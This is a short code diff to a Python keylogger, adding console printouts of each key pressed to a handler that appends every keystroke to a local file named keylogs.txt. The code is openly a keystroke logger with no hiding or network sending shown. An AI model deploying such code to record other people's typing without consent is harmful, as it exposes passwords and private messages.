@@ -5,11 +5,13 @@ def on_press(key):
     try:
         with open('keylogs.txt', 'a') as f:
             if hasattr(key, 'char'):
+                print(f"Key pressed: {key.char}")
                 f.write(key.char)
             else:
+                print(f"Special key pressed: {str(key)}")
                 f.write(str(key))
     except Exception as e:
-        print(f"Error writing to file: {e}")
+        print(f"Error: {e}")
 
 def on_release(key):
     if key == keyboard.Key.esc:
